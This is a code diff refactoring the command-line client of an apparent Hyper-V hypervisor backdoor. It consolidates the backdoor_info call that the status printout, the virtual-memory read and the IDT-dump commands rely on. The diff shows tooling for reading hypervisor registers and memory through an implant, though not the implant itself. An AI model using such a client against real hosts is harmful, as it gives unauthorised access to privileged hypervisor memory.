@@ -2584,8 +2584,9 @@ _end:
 int _tmain(int argc, _TCHAR* argv[])
 {
     uint32_t cpu = 0;
-
+    HVBD_INFO bd_info;
     SYSTEM_INFO sys_info;
+
     GetSystemInfo(&sys_info);    
 
     if (argc >= 2 && !strcmp(argv[1], "--debug"))
@@ -2617,24 +2618,23 @@ int _tmain(int argc, _TCHAR* argv[])
 
     m_quiet = false;
 
-    if (argc <= 2)
+    if (backdoor_info(&bd_info) != 0)
     {
-        HVBD_INFO info;
+        return -1;
+    }
 
-        // no command specified, print hypervisor information
-        if (backdoor_info(&info) == 0)
-        {
-            printf("[+] Hyper-V backdoor is running\n\n");
+    if (argc <= 2)
+    {            
+        printf("[+] Hyper-V backdoor is running\n\n");
 
-            printf("      Hypervisor CR0: 0x%llx\n", info.cr0);
-            printf("      Hypervisor CR3: 0x%llx\n", info.cr3);
-            printf("      Hypervisor CR4: 0x%llx\n", info.cr4);
-            printf(" Hypervisor IDT base: 0x%llx (limit = 0x%x)\n", info.idt_base, info.idt_limit);
-            printf("  Hypervisor GS base: 0x%llx\n", info.gs_base);
-            printf("     VM exit handler: 0x%llx\n", info.vm_exit_addr);
-            printf("       VM exit count: 0x%llx\n", info.vm_exit_count);
-            printf("       VM call count: 0x%llx\n\n", info.vm_call_count);
-        }
+        printf("      Hypervisor CR0: 0x%llx\n", bd_info.cr0);
+        printf("      Hypervisor CR3: 0x%llx\n", bd_info.cr3);
+        printf("      Hypervisor CR4: 0x%llx\n", bd_info.cr4);
+        printf(" Hypervisor IDT base: 0x%llx (limit = 0x%x)\n", bd_info.idt_base, bd_info.idt_limit);
+        printf("  Hypervisor GS base: 0x%llx\n", bd_info.gs_base);
+        printf("     VM exit handler: 0x%llx\n", bd_info.vm_exit_addr);
+        printf("       VM exit count: 0x%llx\n", bd_info.vm_exit_count);
+        printf("       VM call count: 0x%llx\n\n", bd_info.vm_call_count);
 
         if (argc < 2)
         {
@@ -2648,7 +2648,6 @@ int _tmain(int argc, _TCHAR* argv[])
 
         if (!strcmp(command, "--virt-read") && argc >= 5)
         {
-            HVBD_INFO info;
             X64_PAGE_TABLE_ENTRY_4K pte_val;
 
             // read virtual memory at given address
@@ -2667,17 +2666,10 @@ int _tmain(int argc, _TCHAR* argv[])
             {
                 printf("ERROR: Invalid size\n");
                 return -1;
-            }
-            
-            // get hypervisor information
-            if (backdoor_info(&info) != 0)
-            {
-                printf("ERROR: Unable to get backdoor info\n");
-                return -1;
-            }
+            }                       
 
             // get PTE address for given VA
-            if (backdoor_pte_addr(addr, &pte_addr, NULL, info.cr3, NULL) != 0)
+            if (backdoor_pte_addr(addr, &pte_addr, NULL, bd_info.cr3, NULL) != 0)
             {
                 printf("ERROR: Unable to get PTE address\n");
                 return -1;
@@ -2804,19 +2796,11 @@ int _tmain(int argc, _TCHAR* argv[])
         }
         else if (!strcmp(command, "--idt"))
         {
-            HVBD_INFO info;
-
-            // get hypervisor information
-            if (backdoor_info(&info) != 0)
-            {
-                return -1;
-            }
-
             uint8_t *buff = (uint8_t *)malloc(PAGE_SIZE);
             if (buff)
             {
                 // read IDT contents
-                if (backdoor_virt_read(info.idt_base, buff, PAGE_SIZE) == 0)
+                if (backdoor_virt_read(bd_info.idt_base, buff, PAGE_SIZE) == 0)
                 {
                     IDT_ENTRY *idt = (IDT_ENTRY *)buff;
 
